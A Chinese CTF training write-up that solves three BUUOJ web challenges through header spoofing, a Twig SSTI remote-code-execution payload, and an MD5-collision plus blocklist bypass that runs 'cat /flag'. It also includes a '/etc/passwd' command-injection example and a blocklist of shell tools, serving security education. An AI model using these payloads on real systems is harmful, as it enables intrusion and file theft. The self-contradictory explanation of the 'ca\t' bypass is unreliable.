# 第九周

## [极客大挑战 2019]Http



首先打开题目所给网站，发现并没有什么有用的信息

![image-20251218094328033](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512180943304.png)



那么我们的思路就是去看这个**网站的源码**是否存在一些隐藏信息：

> 查看页面源代码
>
> F12
>
> Ctrl + U
>
> 鼠标右键 -> 查看页面源代码



发现源码中有一个名为 “Secret.php” 的文件，

![image-20251218094709066](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512180947208.png)



查看文件，

给出提示：It doesn't come from 'https://Sycsecret.buuoj.cn'



在这里应该想到既然访问 http://node5.buuoj.cn:26774/Secret.php 页面时提示 “他不是来自  'https://Sycsecret.buuoj.cn' ”，再结合我们对网路、数据包的理解：

**我们要通过伪造 Referer 为 'https://Sycsecret.buuoj.cn' ，进行绕过，从而达到查看 Secret.php 的目的**



> 【**Referer**：可以结合AI、搜索引擎去查，当然，目前大家就把它记住就可以了，因为初次接触】
>
> ### 一句话核心理解
>
> **Referer（引荐来源）就是：你从哪个网页，点链接跳转到了当前这个网页。**
>
> 你可以把它想象成 **“介绍信”** 或 **“推荐人”**。
>
> ------
>
> ### 一个生动的比喻
>
> 假设你正在逛**商场A**（比如淘宝），这时你看到一家甜品店的广告，你点击广告后，直接走进了**商场B**（比如京东）里的这家甜品店。
>
> - **店员（京东的服务器）** 看到你进来，他可能会好奇地问：“**您是从哪里知道我们店的呀？**”
> - 你回答说：“**我是从商场A（淘宝）的广告过来的。**”
> - 你给出的这个信息——**“从商场A的广告来”**——就是 **Referer**。
>
> 对于店员（服务器）来说，这个信息很有用：
>
> 1. **知道广告有效**：哦，原来商场A的广告给我们带来了客人。
> 2. **提供个性化服务**：如果你是来自某个特定的活动页面，店员可能会给你一份特别的赠品。
>
> ------
>
> ### 在电脑和网络中的具体表现
>
> 当你在浏览器里：
>
> 1. 在 **网页A**（例如：百度搜索结果页）上，
> 2. 点击了一个 **链接**（例如：某个知乎的回答），
> 3. 浏览器跳转打开 **网页B**（那个知乎回答页）。
>
> **在这个过程中**：
>
> - 你的浏览器在向知乎的服务器请求打开“网页B”时，**会自动、悄悄地在请求信息里附带上一个小纸条**。
> - 这张小纸条上就写着：“**我来自：网页A（百度的网址）**”。
> - 这张“小纸条”就是 **Referer**（它是HTTP请求头的一个字段）。
>
> ------
>
> ### Referer 的主要作用
>
> 1. **防盗链** - **最常见、最重要的用途**
>    - **场景**：小网站A想用大网站B（比如某图库、某视频站）上的图片或视频，就直接把图片链接放到自己网页上。这样，所有访问网站A的用户，都会消耗网站B的流量和带宽，但功劳却算在网站A头上。
>    - **如何解决**：网站B的服务器可以检查 `Referer`。如果发现请求图片的来源（Referer）不是自己的网站，就拒绝提供图片，或者返回一张“禁止盗链”的提示图。你上网时偶尔看到的“此图片仅供XX站用户交流使用”的提示，就是通过检查Referer实现的。
> 2. **流量来源分析**
>    - 网站站长可以通过分析Referer，知道用户都是从哪里来的。
>    - 例如：知乎的后台可以看到，有多少用户来自百度搜索，有多少来自微信分享，有多少是直接输入网址访问的。这有助于他们评估各个渠道的推广效果。
> 3. **防止恶意请求（一定程度）**
>    - 某些关键操作（如支付后的回调页面）可能会检查Referer，确保这个请求是从自家合法的支付页面跳转过来的，而不是某个恶意网站伪造的。
>
> ------
>
> ### 关于隐私和安全
>
> 既然Referer会透露你从哪个网页跳转过来，这可能会泄露一些浏览习惯。因此：
>
> - **浏览器提供了设置**：你可以选择在“隐私模式”下不发送Referer，或者通过一些插件来限制它。
> - **有些网站会刻意剥离Referer**：比如，当你从一个加密页面（HTTPS）点击链接跳转到另一个不加密的页面（HTTP）时，大多数现代浏览器为了安全，**不会发送Referer**，以防止敏感信息泄露。
>
> ### 一个有趣的小知识：拼写错误
>
> 这个词正确的英文拼写应该是 **“Referrer”**（双r）。但在最早的网络规范中，就被错误地拼写成了 **“Referer”**（单r），并且这个错误一直被沿用至今，成为了一个标准术语。
>
> ### 总结
>
> **Referer 就是一个“引路人”，它告诉服务器：“用户是从哪个门走进来的”。**
>
> - **对网站管理者**：它是分析流量、保护资源（防盗链）的重要工具。
> - **对你（用户）**：它是浏览器自动发送的一个背景信息，大部分时候你感觉不到它的存在，但它影响着你能看到什么内容（比如是否能正常显示外站的图片）。



![image-20251218094917765](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512180949968.png)



那么如何修改数据包呢？

我们用到的工具就是 burp、yakit 这类的抓包工具：



这里俩个工具都演示一遍：

burp:

说明：我这里使用的都是burp 的内置浏览器，所以没有配置代理，大家可以自行去研究工具的使用：

![image-20251218100255007](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181002115.png)





![image-20251218100501867](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181005991.png)





访问页面之后就抓到了它的数据包：

![image-20251218100525724](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181005854.png)





右键发送的 Repeater （重放器）

![image-20251218100616807](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181006989.png)



修改数据包：

​	添加：Referer: https://Sycsecret.buuoj.cn

![image-20251218101208921](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181012082.png)



提示：Please use "Syclover" browser

应该想到什么？就是以下的 UA 头

> ### **User-Agent（用户代理）**
>
> 它就是你的**浏览器（或App）向网站做的一句自我介绍**，告诉服务器“我是什么设备，用什么软件”。
>
> **一个例子：**
> `Mozilla/5.0 (iPhone; iOS 17.5) AppleWebKit/605.1.15 (KHTML, like Gecko)`
>
> 服务器一看就知道：“这是一部运行iOS 17.5的iPhone，用的是Safari内核的浏览器。”
>
> **核心作用：**
>
> - **网站适配**：服务器根据它决定给你发**手机版**还是**电脑版**网页。
> - **统计**：网站知道访客都用什么浏览器和系统。
> - **兼容**：针对不同浏览器提供合适的代码。

![image-20251218101227266](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181012397.png)



修改 UA 头：

![image-20251218101837099](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181018264.png)





提示：No!!! you can only read this locally!!!

接下来要伪造本地ip 为：127.0.0.1

可以利用`X-Forwarded-For`协议来伪造

>  **X-Forwarded-For** 是一个记录，它告诉你：一个网络请求在最终到达服务器之前，**经过了哪些“中间人”**。
>
> 它主要用于揭示 **客户端的原始真实IP地址**。





![image-20251218102337676](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181023849.png)



最终拿到flag：**flag{3def2ee9-4ef1-4757-8250-7103aca1cbad}**



------

如果使用 yakit 的内置浏览器，他需要自己安装一个 Google 浏览器才能使用。

![image-20251218102811922](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181028051.png)



同样的流程：

![image-20251218103004402](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181030587.png)



![image-20251218103104228](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181031407.png)







## [[BJDCTF2020]Cookie is so stable](https://buuoj.cn/challenges#[BJDCTF2020]Cookie%20is%20so%20stable)  【SSTI注入】





首先拿到这个题目，要注意观察它的网页的内容：

现在能看到的是有三个页面：index.php（首页） 、Flag、Hint（提示）

![image-20251218103555118](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181035100.png)





咋们先看看Flag，发现他给了一个输入框

![image-20251218103709162](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181037997.png)



而Hint 页面似乎并没有提示？经过第一题 Http 的学习，我们应该想到要查看网页源代码：

![image-20251218103738469](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190933513.png)



果然，发现一行注释掉的提示：**<!-- Why not take a closer look at cookies? -->**    

目前来说似乎用不到，咋们暂且记一下。

![image-20251218103903636](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181039793.png)





接着回到我们的输入框，进行测试：

> ### 为什么要在输入框测试呢？
>
> 这是因为输入框一般连接着该网站的后台数据库，当我们进行输入时，输入的内容会去后端进行查询。正常的查询当然没有问题，但是如果我们输入了一些不安全的函数、方法、语句等，就可能会让后端返回出本不应该返回的内容。这个过程就是绕过。
>
> 
>
> #### 说的直白一些：
>
> 可以把这个输入框想象成一个‘提问窗口’。你输入一个**普通问题**（比如‘上海’），网站后台就去数据库里帮你找关于‘上海’的答案，然后正确显示出来。
>
> 但关键在于，这个提问窗口**没有严格区分‘问题’和‘指令’**。如果你输入的不是一个普通问题，而是一段**特殊的‘暗号’或‘指令’**（比如：‘上海’；顺便把用户密码表也给我），并且后台程序没有能力识别和拒绝这个‘指令’，它就会傻傻地照做。
>
> 于是，本该只回答‘上海’相关信息的网站，却把整个密码表都返回给了你。这个过程，就是一次成功的‘注入攻击’。输入框之所以危险，就是因为它通常是网站接受用户‘指令’最直接的通道。
>
> 
>
> #### **任何将用户输入当作‘代码’或‘指令’来执行的地方，都可能存在注入问题。**
>
> - **连接数据库** -> **SQL注入**：就像你刚才说的，输入特殊语句窃取、篡改数据。
> - **连接系统外壳** -> **命令注入**：如果后台用你的输入来执行系统命令（比如`ping 你的输入`），你输入`127.0.0.1; cat /etc/passwd`，就可能看到系统用户文件。
> - **连接脚本引擎** -> **代码注入/SSTI**：如果网站用模板（如Jinja2）生成页面，你的输入可能被当作代码执行，导致文件读取、远程代码执行。
>
> 所以，**输入框是一个‘边界’**，是我们可以向网站内部逻辑‘投递’数据的地方。测试输入框，就是在测试这个‘边界’是否坚固，能否阻止我们投递的‘恶意代码’进入核心区域。
>
> 
>
> #### 总结：
>
> **输入框的安全问题，根源在于‘程序错误地将用户输入的数据当作了代码来执行’**。CTF中很多Web题目都围绕这一点设计。我们的目标就是找到这些‘信任边界的缺口’，通过构造特殊的输入（Payload）来验证并利用它，从而发现漏洞、加深对安全的理解。



尝试输入数据，从他返回的结果来判断：



输入 1：

![image-20251218104957364](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190933810.png)

返回 1

![image-20251218105008920](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181050711.png)





随便输入 sadfsafaf：![image-20251218105026280](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190934985.png)



返回：

![image-20251218105055222](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512181050016.png)



结果就是输入什么就回显什么，也未进行过滤，



既然如此，那就根据提示抓包查看 cookie 的信息：

输入 111，进行抓包：

![image-20251219093933525](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190939544.png)



在执行提交之后，返回了四个数据包，分别查看

![image-20251219094100550](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190941713.png)



1、 POST 表单提交请求，目标是服务器的`flag.php`文件，提交的数据包含`username=111`和提交按钮

（这个数据包咋们完整的分析一遍，之后的大家自己去分析）

> ### 请求行
>
> ```
> POST /flag.php HTTP/1.1
> ```
>
> - **方法**：`POST`
> - **资源路径**：`/flag.php`
> - **HTTP版本**：`HTTP/1.1`
>
> ### 请求头
>
> ```
> Host: 80a082c8-518d-4bd9-89d2-1941347aeb94.node5.buuoj.cn:81
> Cookie: PHPSESSID=9c89acfb11b4856ddb3bf4fcd3eea9e3
> Content-Type: application/x-www-form-urlencoded
> Upgrade-Insecure-Requests: 1
> Accept-Language: zh-CN,zh;q=0.9
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
> Accept-Encoding: gzip, deflate
> Cache-Control: max-age=0
> Referer: http://80a082c8-518d-4bd9-89d2-1941347aeb94.node5.buuoj.cn:81/flag.php
> Origin: http://80a082c8-518d-4bd9-89d2-1941347aeb94.node5.buuoj.cn:81
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
> Content-Length: 26
> ```
>
> - **Host**：目标主机为`80a082c8-518d-4bd9-89d2-1941347aeb94.node5.buuoj.cn:81`（CTF题目的临时域名）。
> - **Cookie**：包含`PHPSESSID=9c89acfb11b4856ddb3bf4fcd3eea9e3`，用于维持用户会话。
> - **Content-Type**：`application/x-www-form-urlencoded`，表示请求体是URL编码的表单数据。
> - **Upgrade-Insecure-Requests**：`1`，表示客户端支持从HTTP升级到HTTPS。
> - **Accept-Language**：`zh-CN,zh;q=0.9`，优先接受中文。
> - **Accept**：客户端接受多种MIME类型，包括HTML、XML、图像等。
> - **Accept-Encoding**：`gzip, deflate`，支持压缩编码。
> - **Cache-Control**：`max-age=0`，表示不使用缓存。
> - **Referer**：请求来源页是`http://80a082c8-518d-4bd9-89d2-1941347aeb94.node5.buuoj.cn:81/flag.php`，即当前页面。
> - **Origin**：请求来源域，与Referer相同。
> - **User-Agent**：Chrome浏览器（版本143）在Windows 10上的标识。
> - **Content-Length**：请求体长度为26字节。
>
> ### 请求体
>
> ```
> username=111&submit=submit
> ```
>
> - **数据**：`username=111&submit=submit`
>   - `username`字段值为`111`
>   - `submit`字段值为`submit`



![image-20251219094310195](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190943286.png)



2、这个 GET 请求是**POST 表单提交后的后续操作**，服务器通过 Cookie 记录了用户提交的用户名，客户端携带会话和用户标识请求页面，

![image-20251219095137105](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190951195.png)





3、浏览器渲染`flag.php`的 HTML 页面时，发现页面引用了`bootstrap.min.js`（Bootstrap 框架的 JS 文件），于是自动发起请求加载这个静态资源，以实现页面的交互功能（比如按钮、表单样式 / 逻辑）

![image-20251219095445988](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190954068.png)





4、该请求是浏览器加载`flag.php`页面依赖的 jQuery 库文件，属于前端页面渲染的必要步骤，且 jQuery 是 Bootstrap 的基础依赖；

![image-20251219095537344](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512190955420.png)





现在问题已经很明显了，我们应该在 **cookie 的 user 项**进行注入测试，因为真正返回请求资源的是 **cookie 的 user 项**。



这里应该想到的是 ssti注入，**（现在想不到也没关系，慢慢积累**

尝试：`{{2*2}}`，结果如下：

当我们注入 `{{2*2}}` 后，他返回了 `4` ，这就是一个明显的存在 SSTI 注入漏洞的题

![ ](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191001811.png)



接下来就是去构造 payload 获取 flag：

> 当然，存在 ssti 注入的模板肯定不止一种，写模板的语言也不至一种，那么如何去缩小测试范围呢？
>
> 
>
> 观察我们的数据包可以发现：
>
> 其服务端的语言是 PHP
>
> ![image-20251219100520368](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191005503.png)
>
> 那么确定语言之后，就可以缩小一些范围了
>
> 
>
> *补充下各种语言发生ssti注入的模板：*
>
> **python**: jinja2 mako tornado django 
>
> **php**: smarty twig Blade 
>
> **java**: jade velocity jsp



构造 payload：**（不会构造怎么办？ 我们当前需要做的是去学习他人的方法，所以要学会”拿来主义“。下一步要做的呢，就是去分析这个payload，它是如何构成、为什么可以利用漏洞，这是我们需要去思考的。）**

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```



分析：（这个过程就去**使用 AI** 帮助理解）

```
首先这个 payload 是针对 Twig 模板引擎的服务端模板注入的攻击代码，核心目的是执行系统命令 cat /flag 。
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

1. {{_self.env.registerUndefinedFilterCallback("exec")}}
_self：Twig 模板中的内置对象，指向当前模板实例；
env：_self 的属性，指向 Twig 的环境（Environment）对象，是模板引擎的核心配置对象；
registerUndefinedFilterCallback("exec")：调用环境对象的registerUndefinedFilterCallback 方法，作用是注册一个 “未定义过滤器的回调函数” —— 当模板中调用不存在的过滤器时，会执行这个回调函数；这里把回调函数设为 PHP 的 exec 函数（exec 是 PHP 执行系统命令的核心函数）。

2. {{_self.env.getFilter("cat /flag")}}
getFilter("cat /flag")：调用环境对象的getFilter方法，尝试获取名为cat /flag的过滤器；
由于模板中不存在名为cat /flag的过滤器，会触发第一步注册的exec回调函数，最终执行系统命令：exec("cat /flag")，即读取/flag文件内容。


再简单理解就是：
	你告诉模板引擎：“如果有人调用你不认识的过滤器，就执行系统命令（exec）”；
	你故意调用一个名为 “cat /flag” 的不存在的过滤器；
	模板引擎触发第一步的规则，执行exec("cat /flag")，最终拿到 flag 文件内容。
```







![image-20251219102432599](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191024784.png)







## [[安洵杯 2019]easy_web](https://buuoj.cn/challenges#[%E5%AE%89%E6%B4%B5%E6%9D%AF%202019]easy_web)



![image-20251219102855666](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191028924.png)



还是查看源码：

![image-20251219103150314](C:\Users\SZZY\AppData\Roaming\Typora\typora-user-images\image-20251219103150314.png)



base64 解码试一下：

发现是它的熊猫头图片的base64编码，

![image-20251219103513290](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191035343.png)

![image-20251219103432801](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191034995.png)



而我们注意到，这个题目的URL 有一些特别：

`http://3e159e4e-ddcc-4742-9328-b039efc95eea.node5.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=`



那么对 img 的参数解码试一试：

![image-20251219103707577](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191037731.png)

![image-20251219103721346](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191037499.png)

![image-20251219103757741](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191037859.png)





**TXpVek5UTTFNbVUzTURabE5qYz0**

**-> MzUzNTM1MmU3MDZlNjc=**

**-> 3535352e706e67**

**-> 555.png**



最后发现，我们经过 俩次 base64 解码，一次十六进制转字符串，得到了 555.png





**那么现在明确一下刚刚得出的结果：**

**在URL中的img参数放入 555.png 的三次编码（转十六进制、俩次base64编码）的结果：TXpVek5UTTFNbVUzTURabE5qYz0，之后就在网页源代码的 `img` 标签的 `src` 中出现了555.png 这个图片的 base64 编码**

![image-20251219104113175](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191041428.png)





根据上述所得结论，我们想：能不能在 img 包含它的 index.php ，看看会返回什么：



首先：

index.php   -->    TmprMlpUWTBOalUzT0RKbE56QTJPRGN3

![image-20251219105339574](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191053700.png)



现在包含的应该就是 index.php 这个文件的内容

![image-20251219105418018](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191054164.png)



base64解码：

![image-20251219105516974](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191055151.png)



得到题目的源码：（接下来就是代码审计的过程了）

```php
<?php
//强制要求传入img和cmd参数，否则自动跳转至默认参数页面
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');

//img 参数处理与文件读取
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixiï½ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}

//cmd 参数输出与命令执行校验
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}

?>
<html>
<style>
  body{
   background:url(./bj.png)  no-repeat center center;
   background-size:cover;
   background-attachment:fixed;
   background-color:#CCCCCC;
}
</style>
<body>
</body>
</html>
```

审计：

```php
<?php
// 开启错误报告（这里写法有问题，但不影响漏洞）
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');

// 获取 cmd 参数（GET）
$cmd = $_GET['cmd'];

// 如果 img 或 cmd 不存在，跳转到默认参数
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');


// ================= img 参数处理 =================

// img 被：base64_decode → base64_decode → hex2bin
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

// 文件名过滤：只允许字母数字和点
$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);

// 禁止读取 flag 文件
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    // ⚠️ 任意文件读取（在当前目录下）
    // 并通过 base64 包装成 img 输出
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}


// ================= cmd 参数处理 =================
echo $cmd;
echo "<br>";

// 命令黑名单过滤（非常长，但核心问题：漏了 env / printenv）
if (preg_match(
    "/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|
      pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|
      \{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|-|<|>/ix",
    $cmd
)) {
    echo("forbid ~");
    echo "<br>";
} else {

    // ================= 核心漏洞 =================
    // PHP 的“弱类型 MD5 碰撞”
    if ((string)$_POST['a'] !== (string)$_POST['b']
        && md5($_POST['a']) === md5($_POST['b'])) {

        //反引号：执行系统命令（RCE）
        echo `$cmd`;

    } else {
        echo ("md5 is funny ~");
    }
}
?>

```



总结一下这段代码的核心功能：

1. 接收 GET 参数`img`和`cmd`，若未传则自动跳转到带默认参数的页面；
2. 对`img`参数做【两次 Base64 解码→十六进制转二进制】处理，过滤特殊字符后读取对应文件内容，以 Base64 图片形式展示（若文件名含`flag`则拦截）；
3. 接收 POST 参数`a`和`b`，要求`a!==b`但`md5(a)===md5(b)`（MD5 碰撞），满足则执行`cmd`参数对应的系统命令；
4. 对`cmd`参数做黑名单过滤，禁止常见命令 / 符号；
5. 最终输出`cmd`内容、执行结果（若满足 MD5 碰撞）或提示信息。



**构造payload：**



核心代码只有这一段：

```
if ((string)$_POST['a'] !== (string)$_POST['b']
    && md5($_POST['a']) === md5($_POST['b'])) {
    echo `$cmd`;
}
```

想执行命令，**必须同时满足**：

1. `a` 和 `b` **字符串不同**
2. `md5(a) === md5(b)` **完全相等（严格等于）**

➡️ **只能走：真实 MD5 碰撞**



准备一对真实 MD5 碰撞

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2

b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```



构造数据包：

主要结构：

```
POST /index.php?img=&cmd=dir
Host:
Content-Type: application/x-www-form-urlencoded

a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```









尝试执行命令：`dir` **不在黑名单**，Windows / Linux 下都可用



```
POST /index.php?img=&cmd=dir HTTP/1.1
Host: 3e159e4e-ddcc-4742-9328-b039efc95eea.node5.buuoj.cn:81
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1

a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

 MD5 碰撞成功了，并且执行了 dir 命令

![image-20251219121747422](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191217630.png)



查看根目录： `dir%20/`

![image-20251219121944948](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191219096.png)



查看 flag 文件： `ca\t%20/flag `

>### 1. 为什么 `ca\t%20/flag` 能绕过过滤？
>
>在源码中，`$cmd` 参数会经过以下正则检查：
>
>```php
>preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)
>```
>
>关键点：
>
>- 正则中明确匹配了 `cat`（小写）
>- 但是 **`ca\t` 中的 `\t` 是 URL 编码的 `%09`（水平制表符）**
>- 在 URL 中 `%09` 会解码为实际的制表符字符
>- 正则表达式中的 `cat` 是字面匹配，不会匹配 `ca\t`
>- **但在执行时，shell 会将 `ca\t` 解释为 `cat`（因为 `\t` 是转义序列）**
>  - **正则匹配的是字面的"cat"字符串，而`ca\t`在PHP中是"c a \ t"四个字符，匹配失败；但shell执行时把`\t`解析为字面"t"，最终执行了`cat /flag`命令。**
>
>### 2. 执行流程
>
>1. **参数传递**：`cmd=ca\t%20/flag`
>   - `%20` 是空格
>   - 整体相当于 `cat /flag`
>2. **绕过检查**：
>   - 正则检查看到的是 `ca\t /flag`
>   - 不匹配 `cat`（因为中间有制表符）
>   - 通过其他字符检查
>3. **执行时**：
>   - shell 解析 `ca\t` 为 `cat`
>   - 最终执行 `cat /flag`
>   - 返回 flag 内容
>
>- 输入的 `\t` 是通过 URL 传入的原始字符，PHP 的 `preg_match` 在匹配时，`\t` 被当作普通字符处理，没有触发正则的禁止规则。



![image-20251219124928120](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202512191249361.png)













